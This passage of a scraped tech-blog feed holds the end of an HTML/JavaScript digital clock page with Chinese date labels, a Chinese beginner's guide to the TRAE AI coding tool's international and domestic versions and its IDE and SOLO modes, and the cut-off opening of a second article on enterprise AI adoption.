                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"date"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"date"</span>&gt;</span>星期二, 九月 23 2025<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"clock-container"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hour1"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hour2"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-separator"</span>&gt;</span>:<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"minute1"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"minute2"</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-separator"</span>&gt;</span>:<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"second1"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"second2"</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ampm"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"ampm"</span>&gt;</span>PM<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"quote"</span>&gt;</span>
            "When I get a little money I buy books; and if any is left I buy food and clothes."
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"author"</span>&gt;</span>Desiderius Erasmus<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 星期和月份的中文映射</span>
        <span class="hljs-keyword">const</span> weekdays = [<span class="hljs-string">'星期日'</span>, <span class="hljs-string">'星期一'</span>, <span class="hljs-string">'星期二'</span>, <span class="hljs-string">'星期三'</span>, <span class="hljs-string">'星期四'</span>, <span class="hljs-string">'星期五'</span>, <span class="hljs-string">'星期六'</span>];
        <span class="hljs-keyword">const</span> months = [<span class="hljs-string">'一月'</span>, <span class="hljs-string">'二月'</span>, <span class="hljs-string">'三月'</span>, <span class="hljs-string">'四月'</span>, <span class="hljs-string">'五月'</span>, <span class="hljs-string">'六月'</span>, <span class="hljs-string">'七月'</span>, <span class="hljs-string">'八月'</span>, <span class="hljs-string">'九月'</span>, <span class="hljs-string">'十月'</span>, <span class="hljs-string">'十一月'</span>, <span class="hljs-string">'十二月'</span>];
        
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateClock</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
            
            <span class="hljs-comment">// 获取中文日期</span>
            <span class="hljs-keyword">const</span> year = now.<span class="hljs-title function_">getFullYear</span>();
            <span class="hljs-keyword">const</span> month = now.<span class="hljs-title function_">getMonth</span>();
            <span class="hljs-keyword">const</span> day = now.<span class="hljs-title function_">getDate</span>();
            <span class="hljs-keyword">const</span> weekday = now.<span class="hljs-title function_">getDay</span>();
            
            <span class="hljs-comment">// 设置日期（使用中文格式）</span>
            <span class="hljs-keyword">const</span> dateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'date'</span>);
            dateElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">${weekdays[weekday]}</span>, <span class="hljs-subst">${months[month]}</span> <span class="hljs-subst">${day}</span> <span class="hljs-subst">${year}</span>`</span>;
            
            <span class="hljs-comment">// Get current time</span>
            <span class="hljs-keyword">let</span> hours = now.<span class="hljs-title function_">getHours</span>();
            <span class="hljs-keyword">const</span> minutes = now.<span class="hljs-title function_">getMinutes</span>();
            <span class="hljs-keyword">const</span> seconds = now.<span class="hljs-title function_">getSeconds</span>();
            <span class="hljs-keyword">const</span> ampm = hours &gt;= <span class="hljs-number">12</span> ? <span class="hljs-string">'PM'</span> : <span class="hljs-string">'AM'</span>;
            
            <span class="hljs-comment">// Convert to 12-hour format</span>
            hours = hours % <span class="hljs-number">12</span>;
            hours = hours ? hours : <span class="hljs-number">12</span>; <span class="hljs-comment">// the hour '0' should be '12'</span>
            
            <span class="hljs-comment">// Format time with leading zeros</span>
            <span class="hljs-keyword">const</span> formattedHours = hours.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            <span class="hljs-keyword">const</span> formattedMinutes = minutes.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            <span class="hljs-keyword">const</span> formattedSeconds = seconds.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            
            <span class="hljs-comment">// Update the clock display</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hour1'</span>).<span class="hljs-property">textContent</span> = formattedHours[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hour2'</span>).<span class="hljs-property">textContent</span> = formattedHours[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minute1'</span>).<span class="hljs-property">textContent</span> = formattedMinutes[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minute2'</span>).<span class="hljs-property">textContent</span> = formattedMinutes[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'second1'</span>).<span class="hljs-property">textContent</span> = formattedSeconds[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'second2'</span>).<span class="hljs-property">textContent</span> = formattedSeconds[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'ampm'</span>).<span class="hljs-property">textContent</span> = ampm;
        }
        
        <span class="hljs-comment">// Update clock immediately and then every second</span>
        <span class="hljs-title function_">updateClock</span>();
        <span class="hljs-built_in">setInterval</span>(updateClock, <span class="hljs-number">1000</span>);
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE 国际版限免开启！一份给新手的入门说明书]]></title>    <link>https://juejin.cn/post/7595142651728527379</link>    <guid>https://juejin.cn/post/7595142651728527379</guid>    <pubDate>2026-01-15T12:51:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728527379" data-draft-id="7595401278466179113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE 国际版限免开启！一份给新手的入门说明书"/> <meta itemprop="keywords" content="Trae,AI编程,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T12:51:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="飞哥数智谈"/> <meta itemprop="url" content="https://juejin.cn/user/3825956195409223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE 国际版限免开启！一份给新手的入门说明书
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3825956195409223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    飞哥数智谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:51:17.000Z" title="Thu Jan 15 2026 12:51:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>14号上午 <code>TRAE</code> 国际版开启“限免一个月”的活动，吸引了很多新同学。</p>
<p>新同学大多对 <code>TRAE</code> 不太熟悉，因此，我帮大家整理了 <code>TRAE</code> 国际版的一些信息，方便初次接触的同学快速了解。</p>
<p><strong>再次说明，本文适合初次接触 <code>TRAE</code> 国际版的同学。</strong></p>
<p>如果你是老手，请期待后续的文章哈。</p>
<h2 data-id="heading-0">版本：国际版 vs 国内版</h2>
<p><code>TRAE</code> 有两个版本：国际版和国内版。</p>
<p>两者界面风格、使用习惯、功能几乎一样。</p>
<p>最大的区别就是模型不同：</p>
<ul>
<li><strong>国际版</strong>：主要为国际模型，包括顶尖的 GPT-5.2、Gemini-3-Pro等。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62702db26d354ae4965a05d4e46f2354~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=VjdBCQTwyc%2B3KeOnEN4jewqqnuM%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>国内版</strong>：只有国内模型，包括前阵子火热的 K2、GLM-4.7、MiniMax-M2.1等，当然还有字节自有的 Doubao 系列。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a0a2bcdd6524284a3c134c992c0f6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=W9jHHzidpa2d1thHGIPbBRCdIJc%3D" alt="" loading="lazy"/></p>
<p>本次活动仅限<strong>国际版</strong>，因为国内版本身就全部免费（免费的国内版可能会有排队的情况）。</p>
<p>国际版收费是按照次数收费的，免费用户会有一定的免费额度，<code>Pro</code> 用户购买的其实是每月600次的快速请求。</p>
<p>注：由于是按照次数收费的，每次对话请求建议不要太小，不然会有些不划算。如果你壕，请不要在意这句话。</p>
<h2 data-id="heading-1">模式：IDE vs SOLO</h2>
<p>不论国际版还是国内版，目前都支持 <code>IDE</code> 和 <code>SOLO</code> 两种模式。</p>
<p>在 <code>TRAE</code> 软件内，可以通过左上角的开关切换两种模式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/019fafbaa36d47d8b81f2fc92d7b7cf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=HWObKNiao%2BEw3tqCR0e7n1Hn9XY%3D" alt="" loading="lazy"/></p>
<p>简单介绍下 <code>IDE</code> 和 <code>SOLO</code> 两种模式：</p>
<ul>
<li><strong>IDE模式</strong>：本质是一个加了 AI 的开发工具，可以在写代码时AI补全，可以问AI问题，可以让AI基于细化的任务生成代码，但核心依然是开发工具，AI 只是辅助。</li>
<li><strong>SOLO模式</strong>：把 AI 提到了软件开发的核心，你只需要和 AI 对话，剩下的需求理解、产出文档、写代码、构建都由 AI 自主调用相关模型、工具处理，AI 是协调者、是核心。</li>
</ul>
<p>**注意：由于国际版 <code>SOLO</code> 模式是 <code>Pro</code> 会员才能使用的，所以没有 <code>Pro</code> 会员，本次领取的免费额度只能在 <code>IDE</code> 模式中使用哈。</p>
<h2 data-id="heading-2">SOLO 的能力</h2>
<p>下面我们再介绍下 <code>SOLO</code> 具体是什么。</p>
<p>本章节 <code>SOLO</code> 默认指代国际版 <code>SOLO</code>。</p>
<p>个人认为 TRAE SOLO 最大的价值有 2 个：</p>
<ul>
<li>全流程覆盖：AI 支持分析、开发、测试、部署全流程</li>
<li>接管工具丰富：AI 接管包括文档、代码、终端、预览、外部资源各种工具</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9429f17a08a04bb59a60a226d8003fff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=6zyCzRPLZudxep4%2B0CmtlIIoCLg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">第一条，全流程覆盖</h3>
<ul>
<li>你告诉 <code>SOLO</code> 你的目标，比如构建一个博客系统（建议勾选“Plan”）</li>
<li><code>SOLO</code> 会先帮你生成产品文档和技术文档，等你确认，中途也可以沟通修改</li>
<li><code>SOLO</code> 按照确认后的文档进行系统生成，生成过程包括代码编写、基本测试、构建错误自动修复</li>
</ul>
<p>理论上，提示词明确且规模合适，是可以一口气生成可运行应用的。</p>
<p>《<a href="https://juejin.cn/post/7529347270548013107" target="_blank" title="https://juejin.cn/post/7529347270548013107">TRAE SOLO 实测，从需求到上线，这次真的只需要一句话了（附 SOLO CODE 获取方式） - 掘金</a>》</p>
<p>即使初版不满意，也可以接着对话修改。</p>
<h3 data-id="heading-4">第二条，接管工具丰富</h3>
<p>软件开发内设计的各阶段工具 <code>SOLO</code> 基本都已接管，包括文档、代码编辑器、命令终端、内置浏览器、云数据库、前端部署等。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/32451cfccd4a4e0eb2062d868808c4fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=fMoBcy0MidoWnZs8P4EDQmIOA9U%3D" alt="" loading="lazy"/></p>
<p>整个生成过程 <code>SOLO</code> 自动调用相关工具，开启“实时跟随”后，界面也会自动切换当前正在执行的工具。</p>
<h3 data-id="heading-5">其他</h3>
<p>再同步一些信息和经验，方便大家参考：</p>
<ul>
<li>SOLO 默认开启模型的 Max 模式，几乎不会触发单轮对话超出工具调用或者模型调用的上限，但相应的次数消耗也会加剧。</li>
<li>SOLO 默认智能体有两个，SOLO Builder 和 SOLO Coder，Builder更适合 Web 页面的构建，Coder 更适合解决复杂问题。</li>
<li>SOLO 支持多任务并行，意味着前一个对话发出后，可以在执行期间，再次启动另一个对话，执行其他任务。</li>
<li>编程语言支持程度上，个人直观体验如下，仅供参考。前端系列效果都挺好，后端的话 node &gt; python &gt; java &gt; 其他。</li>
</ul>
<h2 data-id="heading-6">结语</h2>
<p>好了，就到这里吧，入门内容不宜太长。</p>
<p>稍微总结下，<code>TRAE IDE</code> 模式是一个加了 AI 的开发软件，<code>TRAE SOLO</code> 目标则更高层一些，更利于非技术人员掌握，或者说，更加符合当前 <code>Vibe Coding</code> 的需要，大家可以根据需要自行选择哈。</p>
<p>如果你有什么好的或坏的注意事项，也欢迎留言，大家一起更好地使用 <code>TRAE</code>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谁来负责企业落地AI？]]></title>    <link>https://juejin.cn/post/7595423767720984585</link>    <guid>https://juejin.cn/post/7595423767720984585</guid>    <pubDate>2026-01-15T12:53:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767720984585" data-draft-id="7595067620950048794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谁来负责企业落地AI？"/> <meta itemprop="keywords" content="AI编程,AIGC,OpenAI"/> <meta itemprop="datePublished" content="2026-01-15T12:53:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="石云升"/> <meta itemprop="url" content="https://juejin.cn/user/642537280772456"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谁来负责企业落地AI？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/642537280772456/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    石云升
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:53:18.000Z" title="Thu Jan 15 2026 12:53:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body 